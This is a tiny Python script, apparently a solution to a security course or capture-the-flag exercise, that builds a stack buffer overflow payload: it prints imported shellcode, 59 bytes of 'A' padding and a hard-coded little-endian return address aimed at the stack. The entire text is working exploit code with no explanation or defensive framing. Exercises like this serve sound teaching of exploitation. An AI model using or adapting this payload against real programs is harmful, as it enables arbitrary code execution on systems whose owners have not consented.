from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*59)
sys.stdout.buffer.write(0xfff6e96c.to_bytes(4, 'little'))

